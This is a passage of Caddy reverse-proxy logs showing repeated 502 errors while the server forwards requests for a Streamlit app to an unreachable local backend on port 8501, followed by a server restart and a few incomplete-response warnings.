Safari/537.36"],"Referer":["https://kairang.pe.kr:8443/"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0079174,"status":502,"err_id":"cfyzw5zgj","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850714.027369,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Priority":["u=1, i"],"Accept":["*/*"],"Referer":["https://kairang.pe.kr:8443/"],"Cookie":["REDACTED"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Mode":["cors"],"Sec-Fetch-Dest":["empty"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua-Mobile":["?0"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0079174,"status":502,"err_id":"aeq29fpnk","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850717.0319057,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Mode":["cors"],"Referer":["https://kairang.pe.kr:8443/"],"Accept":["*/*"],"Cookie":["REDACTED"],"Priority":["u=1, i"],"Sec-Ch-Ua-Platform":["\"Windows\""],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Ch-Ua-Mobile":["?0"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Sec-Fetch-Dest":["empty"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0014416,"status":502,"err_id":"im51dz0ej","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850717.0319057,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Ch-Ua-Mobile":["?0"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Accept":["*/*"],"Referer":["https://kairang.pe.kr:8443/"],"Priority":["u=1, i"],"Sec-Fetch-Mode":["cors"],"Sec-Fetch-Dest":["empty"],"Sec-Fetch-Site":["same-origin"],"Cookie":["REDACTED"],"Sec-Ch-Ua-Platform":["\"Windows\""],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0014416,"status":502,"err_id":"t6200jptt","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850720.0320036,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Accept-Encoding":["gzip, deflate, br, zstd"],"Referer":["https://kairang.pe.kr:8443/"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Accept":["*/*"],"Sec-Fetch-Mode":["cors"],"Sec-Fetch-Dest":["empty"],"Cookie":["REDACTED"],"Priority":["u=1, i"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Fetch-Site":["same-origin"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0092126,"status":502,"err_id":"mkehx6ka8","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850720.0320036,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Accept":["*/*"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Fetch-Mode":["cors"],"Referer":["https://kairang.pe.kr:8443/"],"Priority":["u=1, i"],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Fetch-Site":["same-origin"],"Cookie":["REDACTED"],"Sec-Fetch-Dest":["empty"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Sec-Ch-Ua-Platform":["\"Windows\""]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0092126,"status":502,"err_id":"7jpjt7384","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850722.0506928,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Accept-Encoding":["gzip, deflate, br, zstd"],"Cookie":["REDACTED"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Fetch-Site":["same-origin"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua-Mobile":["?0"],"Accept":["*/*"],"Referer":["https://kairang.pe.kr:8443/"],"Priority":["u=1, i"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Mode":["cors"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Fetch-Dest":["empty"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0017178,"status":502,"err_id":"408mxc9mb","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850722.0506928,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Cookie":["REDACTED"],"Sec-Fetch-Site":["same-origin"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Accept":["*/*"],"Sec-Fetch-Mode":["cors"],"Sec-Fetch-Dest":["empty"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Priority":["u=1, i"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua-Mobile":["?0"],"Referer":["https://kairang.pe.kr:8443/"],"Accept-Encoding":["gzip, deflate, br, zstd"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0017178,"status":502,"err_id":"643fkmwui","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850724.069389,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Fetch-Mode":["cors"],"Referer":["https://kairang.pe.kr:8443/"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Cookie":["REDACTED"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Ch-Ua-Mobile":["?0"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Accept":["*/*"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Dest":["empty"],"Priority":["u=1, i"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0010352,"status":502,"err_id":"wzm18wpik","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850724.069389,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Accept":["*/*"],"Sec-Fetch-Mode":["cors"],"Referer":["https://kairang.pe.kr:8443/"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Dest":["empty"],"Sec-Ch-Ua-Mobile":["?0"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Cookie":["REDACTED"],"Priority":["u=1, i"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0010352,"status":502,"err_id":"a8eaggu6f","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850726.1048393,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Accept":["*/*"],"Referer":["https://kairang.pe.kr:8443/"],"Priority":["u=1, i"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Dest":["empty"],"Accept-Encoding":["gzip, deflate, br, zstd"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Cookie":["REDACTED"],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Mode":["cors"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Ch-Ua-Platform":["\"Windows\""]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0076221,"status":502,"err_id":"n4jsffesn","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850726.1048393,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Ch-Ua-Mobile":["?0"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Cookie":["REDACTED"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Mode":["cors"],"Priority":["u=1, i"],"Accept":["*/*"],"Referer":["https://kairang.pe.kr:8443/"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Fetch-Dest":["empty"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0076221,"status":502,"err_id":"rdd568ams","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850728.1219862,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Priority":["u=1, i"],"Sec-Fetch-Mode":["cors"],"Sec-Fetch-Dest":["empty"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Cookie":["REDACTED"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Site":["same-origin"],"Referer":["https://kairang.pe.kr:8443/"],"Sec-Ch-Ua-Mobile":["?0"],"Accept":["*/*"],"Accept-Encoding":["gzip, deflate, br, zstd"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0018554,"status":502,"err_id":"jc4dypk8c","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850728.1219862,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Mode":["cors"],"Referer":["https://kairang.pe.kr:8443/"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Sec-Ch-Ua-Mobile":["?0"],"Accept":["*/*"],"Priority":["u=1, i"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Dest":["empty"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Cookie":["REDACTED"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0018554,"status":502,"err_id":"03ksnxdk0","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850730.14316,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Dest":["empty"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Sec-Ch-Ua-Platform":["\"Windows\""],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Priority":["u=1, i"],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Fetch-Mode":["cors"],"Referer":["https://kairang.pe.kr:8443/"],"Cookie":["REDACTED"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Accept":["*/*"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0018703,"status":502,"err_id":"n8qxmmzbx","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850730.14316,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Dest":["empty"],"Priority":["u=1, i"],"Accept":["*/*"],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Fetch-Site":["same-origin"],"Referer":["https://kairang.pe.kr:8443/"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Fetch-Mode":["cors"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Cookie":["REDACTED"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0018703,"status":502,"err_id":"1s6mqrx2t","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850730.2290223,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/","headers":{"Accept-Encoding":["gzip, deflate, br, zstd"],"Sec-Fetch-Site":["none"],"Cookie":["REDACTED"],"Priority":["u=0, i"],"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"Sec-Fetch-Mode":["navigate"],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Fetch-User":["?1"],"If-Modified-Since":["Fri, 08 May 2026 12:42:52 GMT"],"If-None-Match":["\"efb36f3b2db85ed77da83c97ec09c2a1\""],"Upgrade-Insecure-Requests":["1"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Ch-Ua-Platform":["\"Windows\""],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Fetch-Dest":["document"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0012011,"status":502,"err_id":"1t5487ad5","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784851034.7442758,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50024","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/","headers":{"Accept-Encoding":["gzip, deflate, br, zstd"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Ch-Ua-Platform":["\"Windows\""],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Ch-Ua-Mobile":["?0"],"Upgrade-Insecure-Requests":["1"],"Sec-Fetch-Site":["none"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Cookie":["REDACTED"],"Sec-Fetch-User":["?1"],"Cache-Control":["max-age=0"],"Sec-Fetch-Mode":["navigate"],"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"Sec-Fetch-Dest":["document"],"Priority":["u=0, i"]},"tls":{"resumed":true,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0154865,"status":502,"err_id":"4kczvdvkv","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784851042.4314067,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50024","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/","headers":{"Sec-Fetch-Dest":["document"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"Sec-Fetch-Mode":["navigate"],"Sec-Fetch-User":["?1"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Ch-Ua-Mobile":["?0"],"Upgrade-Insecure-Requests":["1"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Cookie":["REDACTED"],"Priority":["u=0, i"],"Sec-Fetch-Site":["none"]},"tls":{"resumed":true,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0129315,"status":502,"err_id":"r1yems7kr","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"info","ts":1784851772.3918474,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784851772.392374,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784851772.392374,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784851772.392374,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784851772.392374,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784851772.4107494,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//127.0.0.1:2019","//localhost:2019","//[::1]:2019"]}
{"level":"info","ts":1784851772.4123235,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x1729036adb80"}
{"level":"info","ts":1784851772.424162,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784851772.424162,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784851772.4279144,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784851772.4328508,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784851772.4339483,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784851772.4339483,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784851772.4339483,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784851772.435627,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784851772.435627,"msg":"serving initial configuration"}
{"level":"info","ts":1784851772.4382915,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784938172.4382915,"try_again_in":86400}
{"level":"info","ts":1784851772.438821,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"warn","ts":1784883799.3213062,"logger":"http.handlers.reverse_proxy","msg":"aborting with incomplete response","upstream":"localhost:8501","duration":0.7169231,"request":{"remote_ip":"112.223.35.142","remote_port":"50056","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/static/js/src.D9MArGZj.js","headers":{"Pragma":["no-cache"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Origin":["https://kairang.pe.kr:8443"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Priority":["u=1"],"Sec-Fetch-Mode":["cors"],"X-Forwarded-For":["112.223.35.142"],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Fetch-Site":["same-origin"],"Referer":["https://kairang.pe.kr:8443/"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"X-Forwarded-Proto":["https"],"X-Forwarded-Host":["kairang.pe.kr:8443"],"Cookie":["REDACTED"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Accept":["*/*"],"Sec-Fetch-Dest":["script"],"Cache-Control":["no-cache"],"Via":["2.0 Caddy"]},"tls":{"resumed":true,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"error":"reading: context canceled"}
{"level":"warn","ts":1784883799.322593,"logger":"http.handlers.reverse_proxy","msg":"aborting with incomplete response","upstream":"localhost:8501","duration":0.2212037,"request":{"remote_ip":"112.223.35.142","remote_port":"50056","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/static/js/protobuf.DyZGXwGk.js","headers":{"Cache-Control":["no-cache"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Accept-Encoding":["gzip, deflate, br, 